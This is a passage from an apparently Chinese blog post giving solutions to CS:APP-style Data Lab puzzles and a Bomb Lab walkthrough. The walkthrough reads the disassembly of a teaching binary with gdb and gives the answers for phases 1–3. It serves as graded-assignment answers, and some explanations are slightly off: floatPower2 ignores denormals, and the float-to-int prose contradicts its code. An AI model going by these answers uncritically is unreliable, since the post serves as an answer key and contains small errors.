!!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是正数，寻找最高位1出现的位置，然后加上一位符号位即可。如果是负数的话，只需要知道最高位
0
出现的位置，再添加一个符号位。所以负数可以先对其取反，然后按照正数操作。</p>
<p>寻找过程为 2
分法，利用<code>!!(x &gt;&gt; bits)</code>来判断该段是否有
1。有则左移至该段，否则不移动即另一端。注意最后 2
位的情况，<code>11</code>和<code>10</code>都会使<code>ans1 = 1</code>且<code>ans0 = 1</code>，事实上只有全
0（数
0）的情况会使<code>ans0 = 0</code>。最后注意需要加上一个符号位，最终答案把移位结果累加<code>ans16 + ans8 + ans4 + ans2 + ans1 + ans0 + 1</code>。</p>
<h3 id="floatscale2">11. floatScale2</h3>
<p>实现浮点数乘 2。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分别计算 指数位 符号位 有效位</span></span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="comment">// 分三种情况讨论</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// NaN</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// mult 2</span></span><br><span class="line">    <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | sign;</span><br><span class="line">  <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="comment">// overflow Nan</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | sign | frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IEEE标准32位浮点数格式为：最高位 1
位为<strong>符号位</strong>（sign），8
为为<strong>指数位</strong>（exp），剩下的 23
位为<strong>有效位</strong>（frac）。</p>
<p>根据浮点数范围，浮点数乘2需要分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN ，无穷大，乘2仍然返回原参数；</li>
<li><code>exp == 0x00</code>：非规格数，这时候 frac 无起始 1，乘2即将
frac 部分左移 1
位，同时还需要考虑符号，整体运算等价于<code>(uf &lt;&lt; 1) | sign</code></li>
<li><code>exp == others</code>：
规格化情况，先增加指数位，注意这时候判断是否为 0xff
达到无穷大。按位模式组合成新的浮点数输出即可<code>(exp &lt;&lt; 23) | sign | frac</code>。</li>
</ul>
<h3 id="floatfloat2int">12. floatFloat2Int</h3>
<p>将单精度浮点数转化为int类型整数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;   <span class="comment">// 不参与运算 掩码保留原位置</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 参与运算 移到最右端</span></span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7fffff</span>;    <span class="comment">// 参与运算</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)             <span class="comment">// NaN or infinity</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0x00</span>) <span class="comment">// 非规格化数字都是小于1的数 直接返回0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">// 规格化数字</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> frac1 = <span class="number">0x800000</span> | frac; <span class="comment">// 补充小数部分隐含的1</span></span><br><span class="line">    <span class="type">int</span> exp1 = <span class="built_in">exp</span> - <span class="number">127</span>;        <span class="comment">// 减去偏移值得到真实的移码</span></span><br><span class="line">    <span class="comment">// 超过范围的直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">31</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exp1 &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0u</span>;</span><br><span class="line">    <span class="comment">// 在int表示范围内 判断移位方向</span></span><br><span class="line">    <span class="keyword">if</span> (exp1 &gt; <span class="number">23</span>)</span><br><span class="line">      frac1 = frac1 &lt;&lt; (exp1 - <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      frac1 = frac1 &gt;&gt; (<span class="number">23</span> - exp1);</span><br><span class="line">    <span class="comment">// 根据符号分别返回</span></span><br><span class="line">    <span class="keyword">if</span> (sign) </span><br><span class="line">      <span class="keyword">return</span> ~frac1 + <span class="number">1</span>; <span class="comment">// 负数则返回其补码</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> frac1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分三种情况讨论：</p>
<ul>
<li><code>exp == 0xff</code>：表示NaN
或无穷大，直接返回最大值<code>0x80000000</code>；</li>
<li><code>exp == 0x00</code>：非规格化数字，都是小于1的数，直接返回0；</li>
<li><code>exp == others</code>：
规格化情况，先补充隐含的1，frac变为24位，减去偏移值得到真实的移码exp1。
<ul>
<li>exp1大于31或者小于0都超过int表示范围，直接返回0。</li>
<li>frac相当于已经左移了23位，需要再判断exp1与23的大小，大于23则还需要左移（exp1-23）位，小于则需要右移（23-exp1）位。</li>
<li>最后根据uf的符号分别返回，正数直接返回移位后的数，负数则返回其补码。</li>
</ul></li>
</ul>
<h3 id="floatpower2">13. floatPower2</h3>
<p>计算2.0的x次方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实验结果">实验结果</h2>
<p><img src="/post/ba783922/image-20221014201052512.png" alt="image-20221014201052512" style="zoom: 67%;"></p>
<h2 id="补充">补充</h2>
<ul>
<li><p>编译时一直有个警告：</p>
<p><img src="/post/ba783922/image-20221014200543586.png"></p>
<p>在"btest.c"文件中对arg_test_range[1]初始化即可解决。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sanity check on the number of args */</span></span><br><span class="line"><span class="keyword">if</span> (args &lt; <span class="number">0</span> || args &gt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Configuration error: invalid number of args (%d) for function 	%s\n&quot;</span>, args, t-&gt;name);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;	</span><br><span class="line">arg_test_range[<span class="number">1</span>] = <span class="number">0</span>; <span class="comment">//添加</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Assign range of argument test vals so as to conserve the total</span></span><br><span class="line"><span class="comment">   number of tests, independent of the number of arguments */</span></span><br><span class="line"><span class="keyword">if</span> (args == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = TEST_RANGE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (args == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	arg_test_range[<span class="number">0</span>] = <span class="built_in">pow</span>((<span class="type">double</span>)TEST_RANGE, <span class="number">0.5</span>); <span class="comment">/* sqrt */</span></span><br><span class="line">	arg_test_range[<span class="number">1</span>] = arg_test_range[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>测试时最后一题一直显示超时，将makefile里的m32改位m64，就可以了。</p></li>
</ul>
<h1 id="实验2二进制炸弹bomb-lab">实验2：二进制炸弹（Bomb Lab）</h1>
<h2 id="实验介绍-1">实验介绍</h2>
<p>二进制炸弹是一个包含一系列阶段的可执行程序，每个阶段需要你在<code>stdin</code>上输入一个特定的字符串。如果你输入的字符串正确，那么这个阶段就被成功拆除，炸弹进入下一阶段。否则，炸弹会爆炸，并输出"BOOM!!!",然后终止。当所有的阶段都被成功拆除后炸弹就被拆除。</p>
<h2 id="实验要求-1">实验要求</h2>
<blockquote>
<p>根据“学号后三位%47”领取自己的代码包</p>
</blockquote>
<h2 id="实验思路-1">实验思路</h2>
<p>准备工作: 得到汇编代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bomb &gt;&gt; bomb.s</span><br></pre></td></tr></table></figure>
<h3 id="phase-1">Phase 1</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048b80 &lt;phase_1&gt;:</span><br><span class="line"> 8048b80:	55                   	push   %ebp</span><br><span class="line"> 8048b81:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048b83:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048b86:	c7 44 24 04 b8 99 04 	movl   $0x80499b8,0x4(%esp)</span><br><span class="line"> 8048b8d:	08 </span><br><span class="line"> 8048b8e:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048b91:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048b94:	e8 66 05 00 00       	call   80490ff &lt;strings_not_equal&gt; </span><br><span class="line"> 8048b99:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048b9b:	74 05                	je     8048ba2 &lt;phase_1+0x22&gt;</span><br><span class="line"> 8048b9d:	e8 24 0b 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048ba2:	c9                   	leave  </span><br><span class="line"> 8048ba3:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>这段程序调用了两个函数，根据名字可以猜测函数的作用。<code>strings_not_equal</code>函数，是比较两个字符串是否相等，然后测试函数的返回值，如果不为0则调用<code>explode_bomb</code>程序引爆炸弹。所以问题是怎么找到对比的字符串。可以看到，在第5行，调用<code>strings_not_equal</code>函数前程序为其分配了一个地址空间<code>0x80499b8</code>，猜测该地址可能为函数<code>strings_not_equal</code>的参数地址，也就是有可能是比对字符串的起始地址。打印地址内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x80499b8</span><br><span class="line">0x80499b8:      &quot;The future will be better tomorrow.&quot;</span><br></pre></td></tr></table></figure>
<p>即可得到第一个炸弹的答案:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The future will be better tomorrow.</span><br></pre></td></tr></table></figure>
<h3 id="phase-2">Phase 2</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">08048ba4 &lt;phase_2&gt;:</span><br><span class="line"> 8048ba4:	55                   	push   %ebp</span><br><span class="line"> 8048ba5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba7:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048baa:	8d 45 e4             	lea    -0x1c(%ebp),%eax</span><br><span class="line"> 8048bad:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 8048bb1:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048bb4:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048bb7:	e8 b0 04 00 00       	call   804906c &lt;read_six_numbers&gt; # 读6个数字</span><br><span class="line"> 8048bbc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) # i=1</span><br><span class="line"> 8048bc3:	eb 1e                	jmp    8048be3 &lt;phase_2+0x3f&gt;</span><br><span class="line"> 8048bc5:	8b 45 fc             	mov    -0x4(%ebp),%eax  # a=i</span><br><span class="line"> 8048bc8:	8b 54 85 e4          	mov    -0x1c(%ebp,%eax,4),%edx # d=M[base+4*i-28] A[i-7]</span><br><span class="line"> 8048bcc:	8b 45 fc             	mov    -0x4(%ebp),%eax # a=i</span><br><span class="line"> 8048bcf:	48                   	dec    %eax # a=i-1</span><br><span class="line"> 8048bd0:	8b 44 85 e4          	mov    -0x1c(%ebp,%eax,4),%eax # a=M[base+4*(i-1)-4*7] A[i-8]</span><br><span class="line"> 8048bd4:	83 c0 05             	add    $0x5,%eax #a=a+5</span><br><span class="line"> 8048bd7:	39 c2                	cmp    %eax,%edx #cmp A[i-7]:(A[i-8]+5)</span><br><span class="line"> 8048bd9:	74 05                	je     8048be0 &lt;phase_2+0x3c&gt; #if = goto 8048be0</span><br><span class="line"> 8048bdb:	e8 e6 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048be0:	ff 45 fc             	incl   -0x4(%ebp) </span><br><span class="line"> 8048be3:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp) # comp i:5</span><br><span class="line"> 8048be7:	7e dc                	jle    8048bc5 &lt;phase_2+0x21&gt; # if &lt;= goto 8048bc5</span><br><span class="line"> 8048be9:	c9                   	leave  </span><br><span class="line"> 8048bea:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>有一个<code>read_six_numbers</code>的函数，猜测会从输入中读取六个数字。阅读中间的反汇编代码，判断是比较相邻输入的差是否为
5。所以只要满足+5 的等差数列就是符合条件的正确答案。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 10 15 20 25 30</span><br></pre></td></tr></table></figure>
<h3 id="phase-3">Phase 3</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048beb &lt;phase_3&gt;:</span><br><span class="line"> 8048beb:	55                   	push   %ebp</span><br><span class="line"> 8048bec:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bee:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048bf1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)</span><br><span class="line"> 8048bf8:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048bfb:	89 44 24 10          	mov    %eax,0x10(%esp)</span><br><span class="line"> 8048bff:	8d 45 ef             	lea    -0x11(%ebp),%eax</span><br><span class="line"> 8048c02:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048c06:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048c09:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048c0d:	c7 44 24 04 dc 99 04 	movl   $0x80499dc,0x4(%esp)</span><br><span class="line"> 8048c14:	08 </span><br><span class="line"> 8048c15:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c18:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048c1b:	e8 48 fc ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048c20:	89 45 f8             	mov    %eax,-0x8(%ebp)			# 返回参数值</span><br><span class="line"> 8048c23:	83 7d f8 02          	cmpl   $0x2,-0x8(%ebp) 			# cmp x:2</span><br><span class="line"> 8048c27:	7f 05                	jg     8048c2e &lt;phase_3+0x43&gt; 	# 参数大必须大于2</span><br><span class="line"> 8048c29:	e8 98 0a 00 00       	call   80496c6 &lt;explode_bomb&gt; </span><br><span class="line"> 8048c2e:	8b 45 f4             	mov    -0xc(%ebp),%eax </span><br><span class="line"> 8048c31:	89 45 dc             	mov    %eax,-0x24(%ebp)</span><br><span class="line"> 8048c34:	83 7d dc 07          	cmpl   $0x7,-0x24(%ebp) # 第一个参数必须小于7</span><br><span class="line"> 8048c38:	0f 87 c2 00 00 00    	ja     8048d00 &lt;phase_3+0x115&gt;</span><br><span class="line"> 8048c3e:	8b 55 dc             	mov    -0x24(%ebp),%edx</span><br><span class="line"> 8048c41:	8b 04 95 e8 99 04 08 	mov    0x80499e8(,%edx,4),%eax # 根据第一个参数计算跳转地址</span><br><span class="line"> 8048c48:	ff e0                	jmp    *%eax</span><br><span class="line"> 8048c4a:	c6 45 ff 74          	movb   $0x74,-0x1(%ebp) # 参数1为0跳转到这里，这里的0x74作为第2个参数对比</span><br><span class="line"> 8048c4e:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c51:	3d 66 03 00 00       	cmp    $0x366,%eax  	# 第三个参数与0x366比较</span><br><span class="line"> 8048c56:	0f 84 ad 00 00 00    	je     8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> 8048c5c:	e8 65 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048c61:	e9 a3 00 00 00       	jmp    8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> .......</span><br><span class="line"> 8048d09:	0f b6 45 ef          	movzbl -0x11(%ebp),%eax # 第2个参数与0x74比较，即116</span><br><span class="line"> 8048d0d:	38 45 ff             	cmp    %al,-0x1(%ebp)</span><br><span class="line"> 8048d10:	74 05                	je     8048d17 &lt;phase_3+0x12c&gt;</span><br><span class="line"> 8048d12:	e8 af 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d17:	c9                   	leave  </span><br><span class="line"> 8048d18:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>第16行调用了sscanf函数输入，sscanf函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="comment">//str:数据源</span></span><br><span class="line"><span class="comment">//format:格式化字符串</span></span><br><span class="line"><span class="comment">//sscanf从字符串读取格式化输入，如果成功，该函数返回成功匹配和赋值的个数。    </span></span><br></pre></td></tr></table></figure>
<p>由此猜测第12行的<code>0x80499dc</code>应该是格式化字符串，作为参数传递给sscanf函数，打印该地址的字符串内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x80499dc</span><br><span class="line">0x80499dc:      &quot;%d %c %d&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到要求输入3个参数，且格式为<code>"%d %c %d"</code>。再阅读后面的反汇编代码，可以知道第一个参数必须小于7，且程序依据第一个参数计算跳转地址，为方便起见，直接设置第一个参数为0，直接跳转到第一个判断条件；第一个判断条件比较参数3是否为<code>0x366</code>，即870；同时这里还将<code>0x74</code>保存到了栈<code>-0x1(%ebp)</code>中，是为了与参数2比较。因为参数2为char类型，使用ascii字符，116表示的字符为<code>t</code>；所以最后输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 t 870</span><br></pre></td></tr></table></figure>
<h3 id="phase-4">Phase 4</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">08048d48 &lt;phase_4&gt;:</span><br><span class="line"> 8048d48:	55                   	push   %ebp</span><br><span class="line"> 8048d49:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d4b:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048d4e:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048d51:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d55:	c7 44 24 04 08 9a 04 	movl   $0x8049a08,0x4(%esp)</span><br><span class="line"> 8048d5c:	08 </span><br><span class="line"> 8048d5d:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048d60:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d63:	e8 00 fb ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048d68:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048d6b:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)</span><br><span 